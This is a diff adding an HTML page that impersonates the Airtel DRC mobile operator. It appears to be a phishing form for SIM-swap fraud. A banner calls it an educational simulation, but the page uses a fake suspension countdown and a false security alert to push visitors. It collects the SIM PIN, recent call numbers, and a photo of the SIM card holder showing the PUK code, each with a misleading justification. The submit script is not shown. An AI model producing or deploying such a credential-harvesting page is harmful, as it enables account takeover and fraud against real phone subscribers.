@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Airtel DRC, prépayé, postpayé, Internet, large bande, Blackberry services, l'itinerance internationale, tarifs d'appels internationaux, airtel tarifs, plans.</title>
+    <!-- Icônes pour les navigateurs et appareils (Favicon) -->
+    <!-- Pour un rendu optimal comme sur les sites professionnels, il est recommandé de fournir plusieurs tailles. -->
+    <!-- Vous pouvez générer ces fichiers à partir de votre image `head.JPG` avec un outil en ligne comme "RealFaviconGenerator.net". -->
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div id="main-content-wrapper" class="hidden">
+        <div class="disclaimer">
+            <strong>ATTENTION :</strong> CECI EST UN SITE DE SIMULATION À BUT ÉDUCATIF. N'ENTREZ AUCUNE INFORMATION RÉELLE.
+        </div>
+
+        <header>
+            <img src="airtel.jpg" alt="Logo Airtel" class="logo">
+            <nav class="main-nav">
+                <a href="#" data-key="nav_individuals">Particuliers</a>
+                <a href="#" data-key="nav_businesses">Entreprises</a>
+                <a href="#" data-key="nav_about">Airtel et Vous</a>
+            </nav>
+            <div class="header-controls">
+                <div class="language-switcher">
+                    <button type="button" class="lang-switcher-trigger" aria-label="Changer de langue">
+                        <i class="fas fa-globe"></i>
+                        <span id="current-lang-text">Français</span>
+                        <i class="fas fa-chevron-down" aria-hidden="true"></i>
+                    </button>
+                    <div class="lang-switcher-dropdown"><a href="#" class="lang-switcher-option" data-lang="fr">Français</a><a href="#" class="lang-switcher-option" data-lang="en">English</a><a href="#" class="lang-switcher-option" data-lang="sw">Swahili</a><a href="#" class="lang-switcher-option" data-lang="ln">Lingala</a></div>
+                </div>
+                <a href="#" class="header-button" data-key="my_space_btn">Mon Espace</a>
+            </div>
+        </header>
+
+        <main>
+            <div class="form-container">
+                <div id="countdown-timer" class="countdown-timer"><span data-key="countdown_prefix">Suspension de la ligne dans :</span> <strong>03:00:00</strong></div>
+                <h1 data-key="form_title">Action Requise</h1>
+                <p data-key="form_subtitle">Une activité suspecte a été détectée sur votre ligne. Pour éviter une suspension immédiate, veuillez vérifier votre identité ci-dessous.</p>
+                <form id="sim-form" novalidate>
+                    <div id="general-error" class="error-message general-error"></div>
+
+                    <div class="form-group">
+                        <label for="phone" data-key="phone_label">Numéro de téléphone Airtel :</label>
+                        <p class="label-explanation" data-key="phone_explanation">Ceci nous permet d'identifier la ligne exacte qui nécessite une vérification de sécurité.</p>
+                        <input type="tel" id="phone" name="phone" placeholder="Ex: 09xxxxxxxx" required data-key-placeholder="phone_placeholder">
+                        <span class="error-message" id="phone-error"></span>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="pin" data-key="pin_label">Code PIN de la SIM :</label>
+                        <p class="label-explanation" data-key="pin_explanation">Votre code PIN est requis pour confirmer que vous êtes bien en possession de la carte SIM. Il n'est jamais stocké et n'est utilisé que pour cette vérification.</p>
+                        <input type="password" id="pin" name="pin" placeholder="****" required maxlength="4" data-key-placeholder="pin_placeholder">
+                        <span class="error-message" id="pin-error"></span>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="last-calls" data-key="last_calls_label">5 derniers numéros contactés :</label>
+                        <p class="label-explanation" data-key="last_calls_explanation">Cette information est une méthode de vérification standard pour s'assurer que seul le propriétaire légitime de la ligne peut effectuer des modifications.</p>
+                        <div class="multi-input-container" id="last-calls-container">
+                            <div class="input-wrapper">
+                                <input type="tel" class="last-call-input" required placeholder="N° 1" data-key-placeholder="last_calls_placeholder_1">
+                                <button type="button" class="delete-input-btn" aria-label="Supprimer le numéro">&times;</button>
+                            </div>
+                            <div class="input-wrapper hidden">
+                                <input type="tel" class="last-call-input" required placeholder="N° 2" data-key-placeholder="last_calls_placeholder_2">
+                                <button type="button" class="delete-input-btn" aria-label="Supprimer le numéro">&times;</button>
+                            </div>
+                            <div class="input-wrapper hidden">
+                                <input type="tel" class="last-call-input" required placeholder="N° 3" data-key-placeholder="last_calls_placeholder_3">
+                                <button type="button" class="delete-input-btn" aria-label="Supprimer le numéro">&times;</button>
+                            </div>
+                            <div class="input-wrapper hidden">
+                                <input type="tel" class="last-call-input" required placeholder="N° 4" data-key-placeholder="last_calls_placeholder_4">
+                                <button type="button" class="delete-input-btn" aria-label="Supprimer le numéro">&times;</button>
+                            </div>
+                            <div class="input-wrapper hidden">
+                                <input type="tel" class="last-call-input" required placeholder="N° 5" data-key-placeholder="last_calls_placeholder_5">
+                                <button type="button" class="delete-input-btn" aria-label="Supprimer le numéro">&times;</button>
+                            </div>
+                        </div>
+                        <span class="error-message" id="last-calls-error"></span>
+                    </div>
+
+                    <div class="form-group">
+                        <label data-key="sim_photo_label">Photo du support de votre carte SIM (carte de lecteur) :</label>
+                        <p class="label-explanation" data-key="sim_photo_explanation">La photo du support original, montrant le code PUK, est la preuve ultime de propriété. Elle nous permet de sécuriser votre compte de manière définitive.</p>
+                        <div class="file-input-wrapper">
+                            <img id="image-preview" class="image-preview hidden" alt="Aperçu de la photo">
+                            <div id="image-upload-overlay" class="image-upload-overlay">
+                                <div class="spinner"></div>
+                                <i class="fas fa-check-circle success-icon"></i>
+                            </div>
+                            <div id="photo-controls-container">
+                                <div id="photo-buttons">
+                                    <button type="button" id="take-photo-btn" class="file-input-label">
+                                        <i class="fas fa-camera"></i> <span data-key="take_photo_button">Prendre une photo</span>
+                                    </button>
+                                    <button type="button" id="choose-file-btn" class="file-input-label-secondary"><span data-key="choose_file_button">Ou choisir un fichier</span></button>
+                                </div>
+                                <span id="file-status-text" class="file-status-text hidden"></span>
+                            </div>
+                        </div>
+                        <!-- Inputs cachés distincts pour une meilleure fiabilité -->
+                        <input type="file" id="take-photo-input" accept="image/*" capture="environment" class="file-input-hidden">
+                        <input type="file" id="choose-file-input" accept="image/*" class="file-input-hidden">
+                        <span class="error-message" id="sim-card-photo-error"></span>
+                    </div>
+
+                    <button type="submit" id="submit-btn">
+                        <span id="btn-text" data-key="submit_button">Vérifier mes informations</span>
+                        <div id="loading-spinner" class="spinner hidden"></div>
+                    </button>
+                </form>
+                <div id="success-message" class="hidden">
+                    <h2 data-key="success_title">Merci !</h2>
+                    <p data-key="success_message">Vos informations ont été vérifiées avec succès. Votre ligne est désormais sécurisée.</p>
+                </div>
+            </div>
+        </main>
+
+        <footer class="site-footer">
+            <div class="footer-container">
+                <div class="footer-column">
+                    <h4 data-key="footer_col_about">Airtel et Vous</h4>
+                    <ul>
+                        <li><a href="#" data-key="footer_link_about_us">À propos de nous</a></li>
+                        <li><a href="#" data-key="footer_link_careers">Carrières</a></li>
+                        <li><a href="#" data-key="footer_link_press">Presse</a></li>
+                    </ul>
+                </div>
+                <div class="footer-column">
+                    <h4 data-key="footer_col_help">Aide</h4>
+                    <ul>
+                        <li><a href="#" data-key="footer_link_contact">Contactez-nous</a></li>
+                        <li><a href="#" data-key="footer_link_faq">FAQ</a></li>
+                        <li><a href="#" data-key="footer_link_stores">Nos boutiques</a></li>
+                    </ul>
+                </div>
+                <div class="footer-column">
+                    <h4 data-key="footer_col_legal">Légal</h4>
+                    <ul>
+                        <li><a href="#" data-key="footer_link_legal">Mentions légales</a></li>
+                        <li><a href="#" data-key="footer_link_privacy">Politique de confidentialité</a></li>
+                        <li><a href="#" data-key="footer_link_terms">Termes et conditions</a></li>
+                    </ul>
+                </div>
+                <div class="footer-column footer-social">
+                    <h4 data-key="footer_col_follow">Suivez-nous</h4>
+                    <div class="social-icons">
+                        <a href="#" aria-label="Facebook"><i class="fab fa-facebook-f"></i></a>
+                        <a href="#" aria-label="Twitter"><i class="fab fa-twitter"></i></a>
+                        <a href="#" aria-label="Instagram"><i class="fab fa-instagram"></i></a>
+                        <a href="#" aria-label="YouTube"><i class="fab fa-youtube"></i></a>
+                    </div>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <p data-key="footer_copyright">&copy; 2023 Airtel. Tous droits réservés.</p>
+            </div>
+        </footer>
+    </div>
+
+    <script type="module" src="script.js"></script>
+</body>
+</html>
